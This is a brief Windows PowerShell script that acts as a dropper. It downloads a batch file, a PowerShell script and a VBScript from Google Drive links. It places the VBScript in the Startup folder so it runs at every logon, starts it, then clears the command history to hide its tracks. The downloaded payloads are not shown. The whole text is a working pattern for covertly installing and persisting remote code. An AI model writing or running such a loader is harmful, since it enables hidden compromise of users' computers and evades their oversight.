cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=15yD99m187sHNF6uabhH-ObVnBNkYzE20" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1f0T3cSvdxPrSdVWxA0EcgDbzMpv7S47P" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1myGp6n8kLgWHVaJ1UhhKfwBdMI7amtb6" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit